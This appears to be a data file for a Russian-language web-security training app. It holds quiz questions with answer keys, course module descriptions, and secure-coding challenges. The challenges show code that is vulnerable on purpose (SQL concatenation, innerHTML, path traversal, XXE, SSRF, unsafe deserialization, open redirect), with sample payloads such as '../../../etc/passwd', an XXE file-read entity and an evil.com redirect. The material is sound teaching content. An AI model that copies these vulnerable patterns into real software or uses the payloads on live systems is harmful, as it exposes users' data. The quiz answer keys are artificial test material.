      'script-src \'self\' разрешает загрузку скриптов только с текущего домена и блокирует inline-скрипты (теги <script> и обработчики событий в HTML). Для разрешения inline-скриптов нужен nonce или hash.',
  },
  {
    id: 'xss-7',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Что такое «Mutation XSS» (mXSS)?',
    options: [
      'XSS через мутацию DOM-дерева браузером',
      'XSS, который возникает, когда санитизированный HTML изменяется браузером и становится опасным',
      'XSS через CSS-анимации',
      'XSS в мобильном приложении',
    ],
    correctIndex: 1,
    explanation:
      'Mutation XSS возникает, когда браузер модифицирует HTML после санитизации (например, закрывает незакрытые теги), и результирующий DOM содержит вредоносный код, которого не было в оригинальном санитизированном HTML.',
  },
  {
    id: 'xss-8',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Какой тег HTML может выполнять JavaScript без onclick/onerror?',
    options: [
      '<div>',
      '<span>',
      '<svg><script>...</script></svg> или <img src=x onerror=...>',
      '<p>',
    ],
    correctIndex: 2,
    explanation:
      'SVG поддерживает тег <script>, который выполняется при рендеринге изображения. Также <img src=x onerror=...> и <body onload=...> выполняют JavaScript. <iframe srcdoc=...> тоже может содержать скрипты.',
  },
  // --- Additional CSRF Questions ---
  {
    id: 'csrf-6',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Что такое «Double Submit Cookie» — паттерн защиты от CSRF?',
    options: [
      'Отправка куки дважды для подтверждения',
      'CSRF-токен отправляется и в куки, и в теле запроса; сервер сравнивает их',
      'Использование двух разных CSRF-токенов',
      'Двойная проверка пароля при отправке формы',
    ],
    correctIndex: 1,
    explanation:
      'Double Submit Cookie: сервер устанавливает CSRF-токен в куки (JavaScript может его прочитать), и клиент должен отправить этот же токен в заголовке/теле запроса. Поскольку Same-Origin Policy блокирует чтение кук из другого домена, злоумышленник не может узнать значение токена.',
  },
  {
    id: 'csrf-7',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Почему GET-запросы особенно уязвимы к CSRF?',
    options: [
      'GET-запросы не используют куки',
      'GET-запросы можно инициировать простым <img src="..."> или ссылкой без JavaScript',
      'GET-запросы всегда безопасны',
      'GET-запросы не поддерживают CSRF-токены',
    ],
    correctIndex: 1,
    explanation:
      'GET-запросы можно инициировать без JavaScript: через <img src="http://victim.com/action">, <link>, <script src> или простую ссылку. Это делает GET-запросы особенно уязвимыми. Поэтому важные действия (удаление, перевод денег) должны использовать POST/PUT/DELETE.',
  },
  {
    id: 'csrf-8',
    category: 'CSRF',
    difficulty: 'hard',
    question: 'Какой атрибут куки SameSite является наиболее строгим?',
    options: [
      'SameSite=None',
      'SameSite=Lax',
      'SameSite=Strict',
      'SameSite=Block',
    ],
    correctIndex: 2,
    explanation:
      'SameSite=Strict запрещает отправку куки с ЛЮБЫМИ кросс-сайтовыми запросами (даже при переходе по ссылке). SameSite=Lax разрешает куки для безопасных GET-навигаций (переход по ссылке). SameSite=None разрешает все, но требует Secure (HTTPS).',
  },
  // --- Additional OWASP A01 (Broken Access Control) Questions ---
  {
    id: 'a01-1',
    category: 'OWASP Top 10',
    difficulty: 'easy',
    question: 'Что такое IDOR (Insecure Direct Object Reference)?',
    options: [
      'Некорректная настройка DNS-записей',
      'Когда пользователь может получить доступ к чужим данным, изменив ID в URL',
      'Отсутствие шифрования на клиенте',
      'Уязвимость в заголовках HTTP',
    ],
    correctIndex: 1,
    explanation:
      'IDOR — это уязвимость контроля доступа, при которой злоумышленник изменяет идентификатор объекта в URL или параметрах запроса (например, /api/users/100 вместо /api/users/50) и получает доступ к данным другого пользователя. Сервер не проверяет, имеет ли текущий пользователь права на этот объект.',
  },
  {
    id: 'a01-2',
    category: 'OWASP Top 10',
    difficulty: 'easy',
    question: 'Какой принцип контроля доступа является наилучшим по умолчанию?',
    options: [
      'Разрешить все, кроме запрещённых',
      'Запретить всё, явно разрешить необходимое (deny by default)',
      'Разрешить только GET-запросы',
      'Разрешить аутентифицированным пользователям всё',
    ],
    correctIndex: 1,
    explanation:
      'Принцип deny by default означает, что доступ запрещён по умолчанию, и только явно разрешённые действия доступны. Это предотвращает ситуации, когда новые эндпоинты или функции оказываются без контроля доступа.',
  },
  // --- Additional OWASP A04 (Insecure Design) Questions ---
  {
    id: 'a04-1',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Чем «небезопасный дизайн» (Insecure Design) отличается от бага реализации?',
    options: [
      'Ничем, это одно и то же',
      'Баг реализации — ошибка в коде; небезопасный дизайн — фундаментальный недостаток архитектуры',
      'Небезопасный дизайн — только в мобильных приложениях',
      'Баг реализации легче исправить',
    ],
    correctIndex: 1,
    explanation:
      'Insecure Design — это недостатки, заложенные на этапе проектирования: отсутствие rate limiting, слабые бизнес-правила, отсутствие учёта злоупотреблений. Их нельзя исправить простой правкой кода — требуется изменение архитектуры. Implementation bugs — ошибки в коде (SQLi, XSS), исправляемые изменением реализации.',
  },
  {
    id: 'a04-2',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Что такое «Threat Modeling» (моделирование угроз)?',
    options: [
      'Тестирование безопасности после релиза',
      'Систематическая идентификация потенциальных угроз на этапе проектирования',
      'Настройка фаервола',
      'Обучение пользователей безопасности',
    ],
    correctIndex: 1,
    explanation:
      'Threat Modeling — процесс идентификации, оценки и смягчения угроз безопасности на этапе проектирования системы. Используются методологии STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege), DREAD и PASTA.',
  },
  // --- Additional OWASP A05 (Security Misconfiguration) Questions ---
  {
    id: 'a05-1',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Какой HTTP-заголовок предотвращает MIME-type sniffing?',
    options: [
      'X-Frame-Options',
      'X-Content-Type-Options: nosniff',
      'Content-Security-Policy',
      'X-XSS-Protection',
    ],
    correctIndex: 1,
    explanation:
      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому (sniffing). Без этого заголовка браузер может интерпретировать .jpg-файл как JavaScript, что создаёт XSS-уязвимость.',
  },
  {
    id: 'a05-2',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Какой заголовок Helmet.js добавляет защиту от clickjacking?',
    options: [
      'helmet.xssFilter()',
      'helmet.frameguard()',
      'helmet.hsts()',
      'helmet.dnsPrefetchControl()',
    ],
    correctIndex: 1,
    explanation:
      'helmet.frameguard() добавляет заголовок X-Frame-Options: SAMEORIGIN, который запрещает встраивание страницы в iframe с других доменов. Это предотвращает clickjacking — атаку, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу.',
  },
  // --- Additional OWASP A06 (Vulnerable Components) Questions ---
  {
    id: 'a06-1',
    category: 'OWASP Top 10',
    difficulty: 'medium',
    question: 'Что такое «транзитивная зависимость» (transitive dependency)?',
    options: [
      'Зависимость, указанная напрямую в package.json',
      'Зависимость вашей зависимости — вы не указывали её напрямую, но она установлена',
      'Зависимость, которая обновляется автоматически',
      'Зависимость, которая работает только в production',
    ],
    correctIndex: 1,
    explanation:
      'Транзитивная зависимость — это зависимость вашей зависимости. Например, вы используете пакет A, который зависит от пакета B. Вы не указывали B напрямую, но он установлен. Уязвимость в B может затронуть вас, даже если вы не знаете о его существовании.',
  },
  // --- Additional OWASP A08 (Integrity Failures) Questions ---
  {
    id: 'a08-1',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что такое «Subresource Integrity» (SRI) и зачем он нужен?',
    options: [
      'Механизм проверки целостности загружаемых внешних ресурсов (CDN-скрипты, стили)',
      'Проверка SSL-сертификатов',
      'Валидация JSON-ответов API',
      'Проверка целостности cookies',
    ],
    correctIndex: 0,
    explanation:
      'SRI позволяет браузеру проверить целостность загружаемых ресурсов (скрипты, стили) с CDN по хешу. Атрибут integrity="sha384-..." в теге <script> гарантирует, что файл не был модифицирован. Если хеш не совпадает, браузер не выполнит скрипт.',
  },
  // --- Additional OWASP A09 (Logging) Questions ---
  {
    id: 'a09-1',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что НИКОГДА нельзя логировать в системе аутентификации?',
    options: [
      'IP-адреса пользователей',
      'Временные метки входа',
      'Пароли и токены аутентификации',
      'User-Agent браузера',
    ],
    correctIndex: 2,
    explanation:
      'Пароли, токены, сессионные куки и другие секреты никогда не должны попадать в логи. Если логи будут скомпрометированы (а это случается), злоумышленник получит все учётные данные. Логируйте IP, timestamp, ID пользователя, но никогда секреты.',
  },
  {
    id: 'a09-2',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что такое SIEM (Security Information and Event Management)?',
    options: [
      'Система управления паролями',
      'Платформа для сбора, анализа и мониторинга логов безопасности в реальном времени',
      'Тип фаервола',
      'Инструмент для пентеста',
    ],
    correctIndex: 1,
    explanation:
      'SIEM — это платформа, которая собирает логи из различных источников (серверы, приложения, сетевые устройства), коррелирует события и генерирует алерты при подозрительной активности. Примеры: Splunk, ELK Stack, IBM QRadar.',
  },
  // --- Additional OWASP A10 (SSRF) Questions ---
  {
    id: 'a10-1',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Какой IP-адрес используется для получения метаданных AWS EC2-инстанса?',
    options: [
      '192.168.0.1',
      '10.0.0.1',
      '169.254.169.254',
      '127.0.0.1',
    ],
    correctIndex: 2,
    explanation:
      '169.254.169.254 — это link-local адрес, используемый AWS EC2 для предоставления метаданных инстанса. Через него можно получить IAM-учётные данные, конфигурацию и пользовательские данные. SSRF-атака, направленная на этот адрес, может привести к полной компрометации инстанса.',
  },
  {
    id: 'a10-2',
    category: 'OWASP Top 10',
    difficulty: 'hard',
    question: 'Что такое «DNS Rebinding» в контексте SSRF?',
    options: [
      'Атака, при которой доменное имя сначала указывает на внешний IP, а затем на внутренний',
      'Шифрование DNS-запросов',
      'Переименование DNS-сервера',
      'Кэширование DNS-ответов',
    ],
    correctIndex: 0,
    explanation:
      'DNS Rebinding — атака на SSRF-защиту. Злоумышленник регистрирует домен, который сначала разрешается во внешний IP (проходит валидацию), а затем — в приватный IP (127.0.0.1 или 10.0.0.1). Когда сервер делает запрос к этому домену, DNS-ответ указывает на внутренний ресурс.',
  },
  // --- Additional Secure Coding Questions ---
  {
    id: 'coding-1',
    category: 'Безопасное кодирование',
    difficulty: 'easy',
    question: 'Какую библиотеку лучше всего использовать для санитизации HTML в JavaScript?',
    options: ['jQuery.sanitize()', 'DOMPurify', 'String.trim()', 'JSON.parse()'],
    correctIndex: 1,
    explanation:
      'DOMPurify — проверенная библиотека для санитизации HTML. Она удаляет опасные теги и атрибуты (<script>, onerror, onload и т.д.), сохраняя безопасные элементы (p, b, em, a). Это надёжнее, чем ручная санитизация или использование встроенных методов браузера.',
  },
  {
    id: 'coding-2',
    category: 'Безопасное кодирование',
    difficulty: 'medium',
    question: 'Какой подход к валидации входных данных является наилучшим?',
    options: [
      'Валидация только на клиенте',
      'Белый список (разрешить только ожидаемый формат)',
      'Чёрный список (запретить известные опасные символы)',
      'Валидация только на сервере без учёта клиентской',
    ],
    correctIndex: 1,
    explanation:
      'Белый список (allowlist) — разрешать только то, что явно ожидается. Чёрные списки (blocklist) всегда неполны и могут быть обойдены. Валидация должна быть и на клиенте (UX), и на сервере (безопасность). Белый список для email, телефона, имени — гораздо надёжнее чёрного.',
  },
  {
    id: 'coding-3',
    category: 'Безопасное кодирование',
    difficulty: 'hard',
    question: 'Что такое «Timing Attack» и как защититься?',
    options: [
      'Атака на скорость сети; защита — CDN',
      'Анализ времени выполнения для определения секретов; защита — сравнение за константное время',
      'Атака через таймер браузера; защита — отключить setTimeout',
      'DDoS через таймауты; защита — rate limiting',
    ],
    correctIndex: 1,
    explanation:
      'Timing Attack использует разницу во времени выполнения для извлечения секретов. Например, посимвольное сравнение строк останавливается при первом несовпадении — по времени ответа можно определить количество совпавших символов. Защита: crypto.timingSafeEqual() в Node.js или bcrypt.compare().',
  },
  // --- Additional General Security Questions ---
  {
    id: 'general-11',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «Supply Chain Attack» (атака на цепочку поставок)?',
    options: [
      'Атака на логистическую компанию',
      'Компрометация через зависимость, библиотеку или инструмент, используемый в разработке',
      'Фишинговая атака на поставщиков',
      'DDoS на CDN-провайдера',
    ],
    correctIndex: 1,
    explanation:
      'Supply Chain Attack — атака через компрометацию компонентов разработки: библиотек (npm, PyPI), CI/CD-систем, инструментов сборки. Пример: атака на SolarWinds (2020), внедрение вредоносного кода в обновления пакета event-stream (2018). Защита: аудит зависимостей, lock-файлы, проверка пакетов.',
  },
  {
    id: 'general-12',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «Bug Bounty Program»?',
    options: [
      'Программа лояльности для разработчиков',
      'Программа вознаграждения за найденные уязвимости',
      'Бесплатный хостинг для security-инструментов',
      'Сертификация по безопасности',
    ],
    correctIndex: 1,
    explanation:
      'Bug Bounty — программа, в которой организация выплачивает вознаграждение исследователям безопасности за обнаружение и ответственный disclosure уязвимостей. Примеры: HackerOne, Bugcrowd, Google VRP. Это позволяет привлекать сообщество к улучшению безопасности.',
  },
  {
    id: 'general-13',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что означает «Responsible Disclosure» (ответственное раскрытие)?',
    options: [
      'Публикация уязвимости в социальных сетях',
      'Сообщение разработчику до публичного раскрытия, чтобы дать время на исправление',
      'Продажа уязвимости на чёрном рынке',
      'Игнорирование уязвимости',
    ],
    correctIndex: 1,
    explanation:
      'Responsible Disclosure — практика, при которой исследователь сообщает об уязвимости разработчику и даёт разумное время (обычно 90 дней) на исправление до публичного раскрытия. Это защищает пользователей, не подвергая их риску до выпуска патча.',
  },
  {
    id: 'general-14',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «MITM-атака» (Man-in-the-Middle)?',
    options: [
      'Атака с использованием нескольких серверов',
      'Перехват и возможная модификация связи между двумя сторонами без их знания',
      'Атака на микросервисную архитектуру',
      'Атака через промежуточное ПО',
    ],
    correctIndex: 1,
    explanation:
      'MITM-атака — злоумышленник располагается между двумя сторонами (клиентом и сервером), перехватывая и потенциально модифицируя передаваемые данные. Защита: HTTPS/TLS, проверка сертификатов, Certificate Pinning, HSTS.',
  },
  // --- Quiz category count update needed: SQL + XSS + CSRF + Auth + General + OWASP Top 10 + Secure Coding = 7 ---
];

export const quizCategories = [
  { id: 'sql', name: 'SQL-инъекции', icon: 'Database', count: 10 },
  { id: 'xss', name: 'XSS-атаки', icon: 'FileText', count: 8 },
  { id: 'csrf', name: 'CSRF', icon: 'Link', count: 8 },
  { id: 'auth', name: 'Аутентификация', icon: 'Lock', count: 8 },
  { id: 'general', name: 'Общая безопасность', icon: 'Shield', count: 14 },
  { id: 'owasp', name: 'OWASP Top 10', icon: 'Shield', count: 11 },
  { id: 'coding', name: 'Безопасное кодирование', icon: 'Code', count: 3 },
];

// ============================================================
// Modules config
// ============================================================
export const modules = [
  {
    id: 'owasp',
    title: 'OWASP Top 10',
    description: 'Интерактивный гид по 10 самым критическим угрозам безопасности веб-приложений с примерами кода, реальными кейсами и способами защиты.',
    icon: 'Shield',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 10,
    totalSteps: 10,
  },
  {
    id: 'sql-injection',
    title: 'SQL-инъекции',
    description: 'Практическая лаборатория: 11 заданий от простого обхода аутентификации до WAF Bypass, Out-of-band и Polyglot-атак.',
    icon: 'Database',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 11,
    totalSteps: 11,
  },
  {
    id: 'xss',
    title: 'XSS-атаки',
    description: 'Изучите 6 типов XSS: отражённый, хранимый, DOM-based, SVG, Markdown и PDF. Интерактивные демонстрации атак.',
    icon: 'FileText',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 6,
    totalSteps: 6,
  },
  {
    id: 'csrf',
    title: 'CSRF-атаки',
    description: 'Визуальная симуляция CSRF-атаки с пошаговой демонстрацией, SameSite cookie и механизмами защиты.',
    icon: 'Link',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 1,
    totalSteps: 1,
  },
  {
    id: 'auth',
    title: 'Аутентификация',
    description: 'Тренажёры: проверка надёжности пароля, визуализация брутфорса, демо bcrypt-хеширования, интерактивный TOTP/2FA, безопасность JWT-сессий.',
    icon: 'Lock',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 5,
    totalSteps: 5,
  },
  {
    id: 'secure-coding',
    title: 'Безопасное кодирование',
    description: '15 задач по ревью кода: найдите уязвимость (SQLi, XSS, IDOR, SSRF, XXE, Race Condition) и выберите правильное решение.',
    icon: 'Code',
    difficulty: 'Продвинутый',
    difficultyColor: 'bg-red-100 text-red-800',
    lessons: 15,
    totalSteps: 15,
  },
  {
    id: 'tools',
    title: 'Инструменты безопасности',
    description: 'Интерактивные инструменты: шифры (Цезарь, Виженер, XOR), кодирование (Base64, URL), хеш-функции и генератор паролей.',
    icon: 'KeyRound',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 4,
    totalSteps: 4,
  },
  {
    id: 'security-headers',
    title: 'Security Headers',
    description: 'Интерактивный гид по HTTP-заголовкам безопасности: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.',
    icon: 'ShieldCheck',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 6,
    totalSteps: 6,
  },
];

// ============================================================
// Secure Coding Challenges
// ============================================================
export const secureCodingChallenges = [
  {
    id: 'sc-1',
    title: 'Инъекция в SQL-запросе',
    category: 'SQL-инъекция',
    code: `app.get('/api/user/:id', (req, res) => {
  const query = "SELECT * FROM users WHERE id = " + req.params.id;
  db.query(query, (err, result) => {
    res.json(result);
  });
});`,
    options: [
      { text: 'Добавить валидацию: if (isNaN(req.params.id)) return res.status(400)', correct: false },
      { text: 'Использовать параметризованный запрос: db.query("SELECT * FROM users WHERE id = ?", [req.params.id])', correct: true },
      { text: 'Шифровать параметр id перед использованием', correct: false },
      { text: 'Использовать HTTPS для этого эндпоинта', correct: false },
    ],
    explanation:
      'Конкатенация строки с пользовательским вводом создаёт SQL-инъекцию. Злоумышленник может передать id=1 OR 1=1 и получить все записи. Параметризованные запросы безопасны, так как данные передаются отдельно от SQL-кода.',
  },
  {
    id: 'sc-2',
    title: 'Хранение пароля в открытом виде',
    category: 'Криптография',
    code: `const user = new User({
  username: req.body.username,
  password: req.body.password,  // Сохраняется как есть
  email: req.body.email
});
await user.save();`,
    options: [
      { text: 'Зашифровать пароль через Base64', correct: false },
      { text: 'Хешировать пароль через bcrypt с солью перед сохранением', correct: true },
      { text: 'Хранить пароль в отдельной таблице', correct: false },
      { text: 'Установить сложные требования к паролю', correct: false },
    ],
    explanation:
      'Пароли нельзя хранить в открытом виде. Base64 — это кодировка, а не шифрование (легко обратимо). Правильное решение — использовать bcrypt для создания криптографического хеша с солью. Восстановить пароль из хеша невозможно.',
  },
  {
    id: 'sc-3',
    title: 'XSS через innerHTML',
    category: 'XSS',
    code: `function showSearchResult(query) {
  const el = document.getElementById('results');
  el.innerHTML = "Результаты для: " + query;
}`,
    options: [
      { text: 'Удалить элемент results', correct: false },
      { text: 'Использовать textContent вместо innerHTML', correct: true },
      { text: 'Добавить try-catch', correct: false },
      { text: 'Использовать setTimeout', correct: false },
    ],
    explanation:
      'innerHTML интерпретирует HTML-теги в строке. Если query содержит <script>alert(1)</script>, код будет выполнен. textContent вставляет текст как есть, кодируя спецсимволы — XSS невозможен.',
  },
  {
    id: 'sc-4',
    title: 'Отсутствие проверки авторизации',
    category: 'Контроль доступа',
    code: `app.delete('/api/users/:id', async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'Пользователь удалён' });
});`,
    options: [
      { text: 'Добавить middleware аутентификации и проверку прав', correct: true },
      { text: 'Изменить метод на POST', correct: false },
      { text: 'Добавить CAPTCHA', correct: false },
      { text: 'Логировать все удаления', correct: false },
    ],
    explanation:
      'Этот эндпоинт не проверяет, авторизован ли пользователь и имеет ли он права удалять пользователей. Любой запрос может удалить любую запись. Необходим middleware авторизации и проверка, что пользователь удаляет только свой аккаунт или является администратором.',
  },
  {
    id: 'sc-5',
    title: 'Информация об ошибке в продакшене',
    category: 'Конфигурация',
    code: `app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack  // Полный stack trace!
  });
});`,
    options: [
      { text: 'Удалить обработчик ошибок', correct: false },
      { text: 'В продакшене скрывать детали ошибок, показывать только общее сообщение', correct: true },
      { text: 'Добавить try-catch в каждый маршрут', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'Показ stack trace в продакшене раскрывает структуру приложения, пути к файлам, версии библиотек и другие данные, полезные для злоумышленника. В продакшене нужно показывать общее сообщение и логировать детали ошибки на сервере.',
  },
  {
    id: 'sc-6',
    title: 'Path Traversal — доступ к файлам вне директории',
    category: 'Контроль доступа',
    code: `app.get('/api/files/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.params.filename);
  res.sendFile(filePath);
});`,
    options: [
      { text: 'Использовать path.resolve и проверить, что файл внутри разрешённой директории', correct: true },
      { text: 'Запретить символы .. в имени файла', correct: false },
      { text: 'Шифровать файлы перед отдачей', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'Path Traversal позволяет злоумышленнику получить доступ к файлам вне предназначенной директории через ../../../etc/passwd. path.resolve нормализует путь, после чего нужно проверить, что результат начинается с разрешённой директории: if (!resolvedPath.startsWith(allowedDir)) return 403.',
  },
  {
    id: 'sc-7',
    title: 'XML External Entity (XXE) Injection',
    category: 'Инъекции',
    code: `const libxml = require('libxmljs');
app.post('/api/parse-xml', (req, res) => {
  const xml = req.body.xml;
  const doc = libxml.parseXml(xml);
  // XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  res.json({ data: doc.text() });
});`,
    options: [
      { text: 'Отключить внешние сущности в парсере: libxml.parseXml(xml, { noent: false, dtdvalid: false })', correct: true },
      { text: 'Экранировать символы < и > во входных данных', correct: false },
      { text: 'Использовать JSON вместо XML', correct: false },
      { text: 'Ограничить размер XML-документа', correct: false },
    ],
    explanation:
      'XXE позволяет читать файлы с сервера, выполнять SSRF и DoS (Billion Laughs attack). Внешние сущности в DTD обрабатываются парсером по умолчанию. Решение — отключить noent (substitute entities) и загрузку внешних сущностей. Или использовать парсер без DTD-поддержки.',
  },
  {
    id: 'sc-8',
    title: 'Server-Side Request Forgery (SSRF)',
    category: 'Сетевая безопасность',
    code: `app.get('/api/proxy', async (req, res) => {
  const url = req.query.url;
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});`,
    options: [
      { text: 'Валидировать URL: разрешить только HTTPS и белый список доменов, заблокировать внутренние IP', correct: true },
      { text: 'Использовать POST вместо GET', correct: false },
      { text: 'Добавить таймаут для fetch', correct: false },
      { text: 'Ограничить размер ответа', correct: false },
    ],
    explanation:
      'SSRF позволяет злоумышленнику заставить сервер делать запросы к внутренним ресурсам: 169.254.169.254 (AWS метаданные), localhost, внутренние API. Защита: белый список доменов, блокировка приватных IP (10.x, 172.16.x, 192.168.x, 127.x), только HTTPS, DNS-rebind protection.',
  },
  {
    id: 'sc-9',
    title: 'Insecure Deserialization',
    category: 'Сериализация',
    code: `const serialize = require('node-serialize');
app.post('/api/profile', (req, res) => {
  const profile = serialize.unserialize(req.body.profile);
  res.json(profile);
});`,
    options: [
      { text: 'Использовать JSON.parse вместо кастомной десериализации и валидировать схему через Zod', correct: true },
      { text: 'Добавить try-catch вокруг unserialize', correct: false },
      { text: 'Проверять размер входных данных', correct: false },
      { text: 'Использовать HTTPS для передачи данных', correct: false },
    ],
    explanation:
      'Небезопасная десериализация позволяет выполнить произвольный код. node-serialize поддерживает IIFE (_$$ND_FUNC$$_function(){...}()), который выполняется при десериализации. Решение: использовать JSON.parse (не выполняет код) + валидация схемы (Zod, Joi) для проверки структуры данных.',
  },
  {
    id: 'sc-10',
    title: 'Race Condition — гонка данных',
    category: 'Конкурентность',
    code: `app.post('/api/withdraw', async (req, res) => {
  const user = await db.getUser(req.user.id);
  if (user.balance >= req.body.amount) {
    await db.updateBalance(req.user.id, user.balance - req.body.amount);
    res.json({ success: true });
  }
});`,
    options: [
      { text: 'Использовать атомарную операцию: UPDATE users SET balance = balance - ? WHERE id = ? AND balance >= ?', correct: true },
      { text: 'Добавить блокировку на чтение пользователя', correct: false },
      { text: 'Использовать транзакцию без проверки баланса', correct: false },
      { text: 'Увеличить таймаут запроса', correct: false },
    ],
    explanation:
      'Race Condition возникает при одновременных запросах: два запроса читают баланс 100, оба проверяют >= 50, оба списывают 50 → баланс становится -50. Атомарная операция UPDATE ... WHERE balance >= ? гарантирует, что проверка и обновление выполняются как единая операция без промежутка.',
  },
  {
    id: 'sc-11',
    title: 'Open Redirect — перенаправление на вредоносный сайт',
    category: 'Контроль доступа',
    code: `app.get('/api/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url);
  // Атака: /api/redirect?url=https://evil.com/phishing
  // Пользователь видит знакомый домен, но перенаправляется на фишинговый сайт
});`,
    options: [
      { text: 'Проверять, что URL начинается с разрешённого домена: if (!url.startsWith(\'https://myapp.com/\')) return 400', correct: true },
      { text: 'Использовать res.send вместо res.redirect', correct: false },
      { text: 'Кодировать URL через encodeURIComponent', correct: false },
      { text: 'Добавить заголовок Referer', correct: false },
    ],
    explanation:
      'Open Redirect позволяет злоумышленнику использовать доверенный домен для перенаправления на фишинговый сайт. Злоумышленник отправляет victim.com/api/redirect?url=evil.com, и пользователь доверяет переходу, так как начинается с victim.com. Решение — белый список разрешённых доменов.',
  },
  {
    id: 'sc-12',
    title: 'IDOR — небезопасная прямая ссылка на объект',
    category: 'Контроль доступа',
    code: `app.get('/api/documents/:id', (req, res) => {
  // Любой аутентифицированный пользователь может получить любой документ
  const doc = await db.getDocument(req.params.id);
  res.json(doc);
  // Атака: пользователь с id=5 запросит /api/documents/100
  // и получит документ другого пользователя
});`,
    options: [
      { text: 'Проверять, что документ принадлежит текущему пользователю: if (doc.userId !== req.user.id) return 403', correct: true },
      { text: 'Шифровать ID документа', correct: false },
      { text: 'Использовать POST вместо GET', correct: false },
      { text: 'Добавить логирование запросов', correct: false },
    ],
    explanation:
      'IDOR (Insecure Direct Object Reference) возникает, когда приложение не проверяет, что пользователь имеет права на доступ к указанному объекту. Злоумышленник меняет ID в URL и получает доступ к данным других пользователей. Необходимо проверять принадлежность ресурса.',
  },
  {
    id: 'sc-13',
    title: 'CORS Misconfiguration — неправильная настройка CORS',
    category: 'Сетевая безопасность',
    code: `app.use((req, res, next) => {
  // Опасно: разрешает ЛЮБОЙ домен
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});`,
    options: [
      { text: 'Указать конкретные разрешённые домены вместо динамического origin', correct: true },
      { text: 'Убрать заголовок Access-Control-Allow-Credentials', correct: false },
      { text: 'Запретить все CORS-запросы', correct: false },
      { text: 'Использовать HTTPS вместо HTTP', correct: false },
    ],
    explanation:
      'Установка Access-Control-Allow-Origin в req.headers.origin позволяет ЛЮБОМУ сайту делать запросы с credentials (куки). Злоумышленник создаёт сайт, который делает запрос к уязвимому API, и браузер отправляет куки. Решение — жёстко указать разрешённые домены.',
  },
  {
    id: 'sc-14',
    title: 'API Key Exposure — раскрытие ключей API в клиентском коде',
    category: 'Конфигурация',
    code: `// Клиентский React-компонент
const API_KEY = 'sk-1234567890abcdef';
const API_URL = 'https://api.openai.com/v1/chat';

async function sendMessage(msg) {
  const res = await fetch(API_URL, {
    method: 'POST',
    headers: {
      'Authorization': \`Bearer \${API_KEY}\`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ messages: [{ role: 'user', content: msg }] })
  });
  return res.json();
}`,
    options: [
      { text: 'Вызывать API через серверный прокси-эндпоинт, не раскрывая ключ на клиенте', correct: true },
      { text: 'Обфусцировать API_KEY в JavaScript', correct: false },
      { text: 'Использовать HTTPS вместо HTTP', correct: false },
      { text: 'Закодировать ключ через Base64', correct: false },
    ],
    explanation:
      'Любые данные в клиентском JavaScript доступны пользователю через DevTools. API-ключ на клиенте может быть извлечён любым посетителем сайта. Решение — серверный прокси-эндпоинт, который вызывает внешний API, не раскрывая ключ.',
  },
  {
    id: 'sc-15',
    title: 'File Upload — небезопасная загрузка файлов',
    category: 'Контроль доступа',
    code: `app.post('/api/upload', (req, res) => {
  const file = req.files.document;
  // Сохраняем файл с оригинальным именем
  file.mv(\`uploads/\${file.name}\`);
  res.json({ url: \`/uploads/\${file.name}\` });
  // Атака: загрузка shell.php, который выполнится на сервере
});`,
    options: [
      { text: 'Проверять расширение, MIME-type, генерировать случайное имя файла и хранить вне webroot', correct: true },
      { text: 'Разрешить только изображения', correct: false },
      { text: 'Ограничить размер файла до 1MB', correct: false },
      { text: 'Шифровать файл перед сохранением', correct: false },
    ],
    explanation:
      'Загрузка файлов без проверки типа и имени позволяет злоумышленнику загрузить исполняемый файл (.php, .jsp, .asp), который сервер выполнит. Защита: белый список расширений, проверка MIME-type (не только extension), генерация случайного имени, хранение вне webroot, антивирусная проверка.',
  },
];

// ============================================================
// Security Headers Lab Data
// ============================================================
export interface SecurityHeader {
  id: string;
  name: string;
  category: string;
  description: string;
  attackDemo: string;
  vulnerableConfig: string;
  secureConfig: string;
  quiz: { question: string; options: string[]; correctIndex: number; explanation: string };
}

export const securityHeaders: SecurityHeader[] = [
  {
    id: 'csp',
    name: 'Content-Security-Policy',
    category: 'Защита от XSS',
    description:
